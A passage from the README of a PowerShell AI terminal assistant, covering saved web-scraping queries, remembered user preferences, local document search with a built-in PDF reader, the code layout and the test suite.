  data, it comes out `null`; the next draw's is never taken. With
  `records=N` the first N blocks are taken, as a list.
- **Pages that are JSON.** If the page is JSON, the label is the key
  (`drawDate`) and the value is what is between quotes, or the number. An
  object or a list does not count as data.
- **The value is the page's text, as is.** Nothing is converted: the ticket
  "09065" keeps its zero and the prize, its "C$".

### By asking in the conversation

If the request for a command mentions the internet, a page, a website,
DuckDuckGo or curl, or contains an `https://` address, a web query is saved
instead of a PowerShell command:

1. **The page.** If you give the address, that one is used. If not, the
   model writes the search and DuckDuckGo is searched. You pick a result by
   its number, paste another address or type another search.
2. **The data.** The model reads the beginning of the page and proposes the
   labels. Each label has to be on the page and give a piece of data: if
   not, it is told what failed and fixes it (three attempts). Fields that
   give nothing are removed, and it says which.
3. **You see it before it is saved.** The JSON with the data read at that
   moment is shown. You can ask for changes ("remove the branch", "give me
   the last 3") or type "another" to choose another page.
4. **Name, what it is for and one confirmation**, as with commands.

If a normal command does not come out ("I didn't find one that works"),
typing "web" looks for the data on the internet.

### In one go, with `/command web`

```
/command web nicaragua-lottery https://loterianacional.com.ni/resultados/ draw=Sorteo winner="Ganador:" prize="Premio:" date="Fecha:"
```

Labels with spaces go in quotes, and `records=5` takes five blocks. The page
is read and what comes out is shown before asking whether to save it.

### Using it

Just like a saved command:

- it is listed with `/command`;
- `/command nicaragua-lottery` shows the JSON without going through the
  model;
- asking with the words of the name ("what was the latest Nicaragua lottery
  draw?") runs it before asking the model;
- the model can also ask for it by name.

The model receives the JSON labeled with the page it comes from. If you ask
it for JSON, it copies it as is. If not, it tells it in sentences without
changing figures, names or dates.

### Limits

- **The page has to have the data in its HTML.** Pages that draw it with
  JavaScript when they open arrive almost empty, and it warns you.
- **If the page changes its labels, the query stops giving data** and says
  so; nothing is made up. It is fixed by saving it again.
- **The model only sees the beginning of the page** (3500 characters) to
  propose the labels. If the data is further down, write them yourself with
  `/command web`.
- **Look at the list of results before choosing.** The search can bring
  pages from another country or another lottery. With the sentence "...as
  json", Gemma 4 E4B searched "API lotería Nicaragua JSON" and the first
  result was an API for Spain's lottery. Now the search does not include the
  format, and what is taken is shown before saving.
- **The same address rules as commands:** only `https`, a public server and
  every redirect checked. Up to 8 fields and 10 blocks. Queries count
  toward the 20 saved commands.

## Preferences

What you want taken into account always, also in future conversations:

```
Ariel > remember to give me money figures in dollars
  preference: Give me money figures in dollars
  Shall I save it for this and future conversations? (y/n) y
saved. I will keep it in mind in this and future conversations (/preferences lists them).
```

- **How they are saved:**
  - by starting the message with "remember that", "remember to", "keep in
    mind that", "bear in mind that", "take note:", "save to my
    preferences:", "from now on", "starting now" or "going forward" (or
    with "always answer...", which is kept whole); the Spanish openings
    ("recuerda que", "ten en cuenta que", "de ahora en adelante"...) work
    too;
  - or with `/preference add <text>`.
- **It always asks before saving.** The message is recognized by how it
  starts, and that can be wrong. If you answer no, the message goes to the
  model like any other.
- **Only you write them.** The model has no tool to save them, so a page it
  reads in a search cannot slip a "preference" into it. If you ask it to
  remember something another way ("so you remember it next time"), it
  answers that it cannot and tells you how to do it. It used to answer "I'll
  remember it", and that was false.
- **How the model uses them:** they go with every question, at the end of
  the system instruction. After an internet search they are repeated next
  to the results, because that is what the model reads when writing.
- **Currencies:** with "figures in dollars" saved and a page in córdobas, it
  is asked to look up the exchange rate and give both figures, and never to
  convert with a rate from memory. Gemma 4 E4B does not always do it.
  Sometimes it gives the source's figure and offers to convert it, but it
  does not make up the rate.
- **Commands:** `/preferences` lists them, numbered, and `/preference remove
  <number>` deletes one.
- **Limits:** up to 12 preferences of up to 200 characters, saved in
  `%LOCALAPPDATA%\PRC-CMD-AI\preferencias.json`. The local server has a
  4096-token context and the preferences travel with every request. If the
  file gets corrupted, it warns you and does not overwrite it.

## Documents

A folder with your business's documents (services, prices, staff, opening
hours, procedures, internal policies...) and the terminal answers with what
they say. For people who will use it in their business without technical
knowledge there is the [documents usage guide](docs/documents-guide.md): how to prepare the folder, which PDFs
work, how to ask, check and forget. The example here is an invented hardware
store, the one used in the tests (there its documents are in Spanish;
`tests/negocio.ps1 -Idioma en` creates an English business, a coffee shop):

```
Ariel > learn from the documents in D:\MyBusiness
ai > I'm going to read the documents in D:\MyBusiness to answer you with what they say. I don't
     change them or send them anywhere: what I read stays on this computer.
ai > There are 12 I can read (2 Word, 2 text, 2 OpenDocument, 1 Excel, 1 CSV, ...).
ai > What are they about, in a few words? That way I know when to look at them; ...
Ariel > my hardware store: hours, staff, prices, policies and procedures
ai > Done: I read 10 documents (16 passages) in 0.5 s. Ask me anything about ...
Ariel > how much is key cutting and since when?
checking your documents: prices.xlsx
ai > Key cutting costs 50 and has been available since November 10, 2025. This comes
     from prices.xlsx (section "Sheet: Services").
Ariel > how much does Luis Mora make?
ai > The document employees.csv says Luis Mora is a Cashier on the Afternoon shift, but
     it does not give his salary.
```

### How it works

- **The model is not trained.** On a modest computer it can't be done, and a
  model "trained" on some documents mixes them up and fills in the gaps by
  making things up. What happens instead is that, for each question, the
  passages that are relevant are looked up. Those passages travel with the
  question, each with the name of its file, and the model is asked to answer
  with them and say which document the fact comes from. If they don't say
  it, it says it is not in the documents.
- **The search is by words**, without accents, without plurals or gender and
  with verb forms trimmed ("venden" finds "vendemos"). It has a few synonyms
  for what people ask a business: hours/open/opening, employee/staff,
  price/cost/fee... Those category words weigh less than the others: in "how
  much does the oven cost?" it is "oven" that matters, not "cost". It does
  the same in English (stop words, plurals, -ing and -ed forms), and each
  group of synonyms also has its Spanish words: a question in one language
  finds a document in the other ("price" finds "precio"). It works without
  dependencies, without touching llama-server and in milliseconds.
- **When they travel:** only if the question has to do with the documents,
  that is, if the best passage has words from the question that do not
  appear everywhere. "What is the capital of France?" or "what time is it?"
  are answered as usual. If they don't travel on their own, the model can
  ask for them with the `consultar_documentos` tool ("do you have a branch
  in León?").
- **Before answering it says what it is checking** (`checking your
  documents: prices.xlsx`) and, at the end, which documents the answer came
  from.
- **Tables are read row by row.** If the first row is a safe header, each
  row carries its labels ("Name: Ana Pérez | Position: Manager"). It is safe
  when it is all text and some column has numbers below. If not, it goes
  separately as "Columns (first row)". A two-column table "Manager | Ana" is
  not taken as a header: pairing a label with the wrong data would be giving
  false data.
- **In Excel, dates and times come out as dates and times.** Excel stores
  them as numbers (45971 is November 10, 2025; 0.3125 is 07:30), and they are
  converted according to the cell's format. With the messages in English
  they come out as in an English Excel: 11/10/2025, 7:30 AM and currency
  cells with their symbol ("$4.95").

### What it can read

| Format | Files |
| --- | --- |
| Word | `.docx` and `.docm` (headings, lists and tables; without text deleted with track changes) |
| Excel | `.xlsx` and `.xlsm` (each sheet with its name) |
| PowerPoint | `.pptx` and `.pptm` (each slide, in order) |
| PDF | `.pdf` with text (headings by font size, tables in columns; see below) |
| OpenDocument | `.odt`, `.ods`, `.odp` |
| Text | `.txt`, `.md`, `.markdown`, `.csv`, `.tsv`, `.json`, `.xml`, `.html`, `.htm`, `.rtf`, `.log`, `.ini`, `.yml`, `.yaml` |

Text files are read as UTF-8 or Windows-1252, which is how old Notepad and
Spanish Excel used to save them. Old Office formats (`.doc`, `.xls`, `.ppt`)
are not read: it says which ones they are and that they have to be saved in
the new format. Images and other files are ignored, as are hidden files,
Office temp files (`~$...`) and folders that start with a dot.

**PDFs** are read with `lib/pdf.ps1`, without libraries. A PDF does not store
text, but which letter is drawn, where and with which font. The pages are
gone through in order and each letter is decoded with its font: first with
its ToUnicode table and, if it has none, with its encoding and its glyph
names. From the position it decides whether there is a space, a line break,
a paragraph or a table column (` | `). A line in a font clearly larger than
the body (or short and all in bold) comes out as a heading (`# ...`), the
same as with Word, so the passages carry their section. It has been tested
with real PDFs from Edge and from "Microsoft Print to PDF", and with test
PDFs built the way Word and Chrome build them: compressed, with objects
inside streams and with subset fonts. It has not been tested with a PDF made
by Word, because Word was not installed. What it does not read, it says,
with the reason:

- **Scanned:** they are an image and have no text, unless they carry an OCR
  layer, which is read.
- **Protected** with a password or against copying: it suggests printing
  them to "Microsoft Print to PDF" to get an unprotected copy.
- **Fonts that can't be decoded:** a subset font without a ToUnicode table
  gives scrambled letters, and a price with scrambled letters is false data.
  The undecoded letters are counted and it checks whether the text looks
  like text: with more than 5 % undecoded letters, or with words without
  vowels and stray symbols, that PDF is not read.

### Commands

- `learn from the documents in D:\MyBusiness`, `read the folder "D:\My
  documents\Company"` or `/documents add <folder>`: adds a folder, with its
  subfolders. It asks what it is about, because that tells the model when
  to look at it.
- `/documents`: the folders, how much was read from each one and what could
  not be read, with the reason.
- `/documents search <text>`: the passages that would come up for that
  text, without asking the model. It is for seeing why it answers what it
  answers.
- `/documents update`: checks the folders again now. It is not usually
  needed: they are checked on their own every five minutes, and only what
  changed is read.
- `/documents remove <name>`: stops reading a folder. The name is the short
  one shown by `/documents` (the folder's name in lowercase, without accents
  and with dashes: `D:\My Business` is `my-business`). Its files stay where
  they were.
- `/documents forget <document, section, topic or everything>`,
  `/documents forgotten` and `/documents restore <number>`: see
  "Forgetting".
- `/documents on|off`: use them or not in this session. They are also
  turned off with `-NoDocuments` or with `"documentos": false` in
  `settings.json`.

### Forgetting

You can forget everything or just a part. What is forgotten is what was
read; your files are not touched:

```
Ariel > forget about the extension
ai > I'm going to forget what mentions "extension" (6 lines of Employees.csv). Your files are not touched.
  for example:
  - Employees.csv: Extension: 101
  - Employees.csv: Extension: 102
  ...
ai > Shall I forget it? ("yes" or "no")
Ariel > yes
ai > Forgotten. If you change your mind: /documents forgotten and /documents restore <number>.
```

- **What can be forgotten:**
  - **Everything:** "forget everything you learned" or
    `/documents forget everything`. It removes the folders and what was
    saved from them.
  - **A folder:** "stop using the folder business".
  - **A document:** "forget the document Employees.csv". It is no longer
    read, and what was read from it is deleted.
  - **A section of a document:** "forget the section Permissions". It goes
    with everything under it, and the rest of the document stays.
  - **A topic in all the documents:** "forget about the salaries". Only the
    lines that talk about it are removed. In a table row only that piece of
    data is removed ("Salary: 25000"), unless it is the first one in the
    row, the one that says what the row is about; then the whole row goes,
    so as not to leave a price without its product.
- **In what order it searches:** first the exact name of a folder, a
  document or a section; then part of the name; if not, it is a topic. That
  way "permissions" is the section Permissions and not the document
  "Vacations and permissions".
- **It always shows what it is going to forget,** with examples, and asks
  for a yes.
- **It can be undone** for what was forgotten from a document, a section or
  a topic: `/documents forgotten` lists it and `/documents restore <number>`
  uses it again. It is kept in `documentos-olvidos.json`. Forgetting a
  folder or everything is not undone this way, because it removes the folder
  from the list (and with "everything", also the list of forgotten items):
  it is read again with `/documents add`.
- **What was already said in the conversation** stays in its memory; `/new`
  clears it.

### Privacy

The documents are never modified. What was read is saved in
`%LOCALAPPDATA%\PRC-CMD-AI\documentos\`, so as not to reread each time what
did not change; the list of folders goes in `documentos.json` and what was
forgotten in `documentos-olvidos.json`, in the same `PRC-CMD-AI` folder. The
passages are only sent to the local providers (Gemma, Qwen, Ollama). With an
internet provider (xAI, OpenAI) they would leave the computer, so they are
not sent and it warns you once. To allow it in one session there is
`/documents cloud on`, and for good, `"documentos_nube": true` in
`settings.json`.

### Limits

- **Speed:** 400 documents (2.4 MB of text) are read the first time in about
  5 s. When starting again, the saved index loads in less than half a
  second. Each question searches in about 0.2 s. PDFs go slower, because
  PowerShell goes letter by letter: about 15 pages from Chrome (which places
  each letter separately, the worst case) in 3 s. Only the first time: what
  was read is saved and not reread as long as it does not change.
- **Caps:** 10 folders, 3000 files, 30 MB per file and 1.5 million
  characters of text per file. At most 4 passages of 700 characters travel
  per question, because the local server has a 4096-token context.
- **It searches for words, not ideas.** A question without any word from the
  documents ("what color are the work clothes?" when the document says
  "uniform") may not find them. The model can still ask for them with the
  tool, or you can try `/documents search`.
- **An answer is only as good as the passages.** If two documents
  contradict each other, the model sees both. With "what time do you open on
  Saturdays?", Gemma 4 E4B gave the warehouse's hours, which were on another
  sheet of the Excel file.

## Code structure

```
AI.bat              CMD launcher: separates the question from the options and
                    passes the question through the AI_QUESTION variable
                    (avoids the quoting bug of "powershell -File")
bin/ai.ps1          main CLI: REPL, one-answer mode, subcommands and the
                    English names of the commands
lib/idioma.ps1      the language of the messages (Spanish or English) and how
                    it is chosen
lib/core.ps1        HTTP core (HttpWebRequest), SSE streaming, <think>
                    filter, error parser for the different APIs
lib/providers.ps1   declarative table of providers and aliases
lib/ui.ps1          ANSI colors, incremental Markdown rendering, PSReadLine
lib/web.ps1         internet search: is there a connection?, DuckDuckGo,
                    reading pages and the buscar_web tool
lib/equipo.ps1      what the computer already knows: the clock, the eight
                    readings (battery, network, Windows, hardware), the
                    shortcut and the datos_equipo tool
lib/comandos.ps1    read-only commands saved by the user: the rules
                    (PowerShell parser and closed lists), piece-by-piece
                    execution and the comando_guardado tool
lib/consultas.ps1   saved web queries: reading a page, taking the data by
                    its labels and giving it as JSON
lib/preferencias.ps1 what the user asks to remember: recognizing "remember
                    that...", saving and loading, and the note for the model
lib/documentos.ps1  the document folders: readers for each format,
                    passages, index and word search, and the
                    consultar_documentos tool
lib/pdf.ps1         the text of a PDF, without libraries: objects, streams,
                    fonts (ToUnicode, encodings) and the position of each
                    letter
tools/Set-AIKey.ps1 secure key storage in HKCU\Environment
tools/build.ps1     normalizes encoding: UTF-8 with BOM in .ps1, CRLF in .bat
tests/probar.ps1    runs all the tests and says which ones fail
tests/*.ps1         one test per part; their sentences and scenes, in tests/datos/
tests/hacer-pdf.ps1 writes the test PDFs (it is not a test)
tests/negocio-en.ps1 the test business in English (loaded by negocio.ps1
                    with -Idioma en)
HISTORIAL.md        what changed in each version, why and how it was tested
                    (in Spanish)
docs/documents-guide.md  usage guide for the documents, for a business
                    owner (in Spanish: docs/guia-documentos.md)
docs/video/         the presentation video: script, narration and its voice,
                    real terminal captures and the HyperFrames composition
                    that renders it
```

If you edit any `.ps1` or `.bat`, run `tools/build.ps1` afterwards: Windows
PowerShell 5.1 decides a script's encoding by its BOM, and a `.ps1` without
a BOM with accented characters is read as cp1252 and ends up as mojibake (or
does not parse at all).

## Tests

After a change, and before pushing it:

```
powershell -NoProfile -ExecutionPolicy Bypass -File tests\probar.ps1
```

Without a model and without internet it takes about 30 seconds and runs
eight tests:

| Test | What it checks |
| --- | --- |
| `comandos.ps1` | Saved commands: 158 commands from `datos/reglas.txt` that the rules must accept or reject, the plan that runs, addresses, names, execution, saving and loading, what the model sees and the shortcut. |
| `equipo-frases.ps1` | 58 sentences from `datos/equipo-frases.txt` and two more cases: which computer data each one asks for, or none. |
| `equipo.ps1` | Clock, formats with a fake computer and the real reading of this computer. That reading is shown on screen and not saved. |
| `preferencias.ps1` | Which messages ask to remember something and what gets saved, the cleanup, saving and loading, the corrupted file, the note for the model and that the model cannot save them. |
| `consultas.ps1` | Web queries, with a sample page (`datos/consulta.html`): finding labels, the blocks and the missing data, JSON pages, the JSON that comes out, what the model proposes, saving and loading, and which requests go to the internet. |
| `documentos.ps1` | Documents of an invented hardware store in every format, created on the fly in a temporary folder (there are no binaries in the repository). It checks each reader (and real test PDFs: compressed, with objects inside streams, subset fonts with ToUnicode, letters by their name, and the ones that are not read: scanned, protected, without a letter table and broken), the passages, what is reread and what is not, the saved index, 15 questions that have to find their passage and 6 that must not bring up documents, the conversational requests and the order of the `/documents` commands, and also forgetting. With `-Crear <folder>` it only creates the hardware store, to try it by hand. |
| `negocio.ps1` | A whole invented business, the Panadería y Cafetería La Espiga (a bakery and café): who they are, services and prices, staff, hours per branch, vacations and leave, rules, procedures, complaints, orders, suppliers, food safety, inventory, and needs and goals. It comes in thirteen formats (the cake catalog is a PDF), with traps: data that is not there, two schedules, a scanned invoice in PDF and a Word temp file. Without the model it checks the processing: what is read from each file, that each of the 34 questions finds its document, and forgetting. With `-Crear <folder>` it only creates the documents. With `-Idioma en`, the same with a business in English (Linden Street Coffee House, a US coffee shop, in `negocio-en.ps1`) and the program in English; `probar.ps1` does not run it on its own. |
| `dialogo.ps1 -SoloReconocer` | Recognizing when a sentence asks to save a command (`datos/peticiones.txt`) and reading what the model proposes. |

Options:

- **`-Red`:** adds a few real requests to the internet, for the public IP, a server that does not exist and the Nicaraguan National Lottery page.
- **`-Modelo`:** needs llama-server running and takes several minutes. It runs the eleven scenes from `datos/escenas.txt` through the real dialog of `bin/ai.ps1`, with the user's answers already written, and tests `/command add` with nine cases. It also asks the model the questions from `negocio.ps1` and checks each answer:
  - the data that is there has to come out, and from the document;
  - what is not there ("how much does Lucía make?", "do you take cards?") has to say it is not there, without made-up figures or emails;
  - what is not about the business ("what is the capital of France?") is answered without documents;
  - what was forgotten is no longer known.

The model's answers change from one run to the next: if a scene fails, read its conversation before accepting the failure.

Each test exits with its number of failures, and `probar.ps1` exits with the number of tests that failed (0 means everything is fine).

## Known limitations

- Designed for Windows; it has not been tested on PowerShell for
  Linux/macOS.
- No support for images or attached files beyond the stdin / `-Context`
  context and the `/documents` folders. The only tools are `buscar_web`,
  `datos_equipo`, `comando_guardado` and `consultar_documentos`.
- The cost of the REPL's memory grows with the conversation (it is sent in
  full on every turn): use `/new` in long conversations.

## License

[MIT](LICENSE).
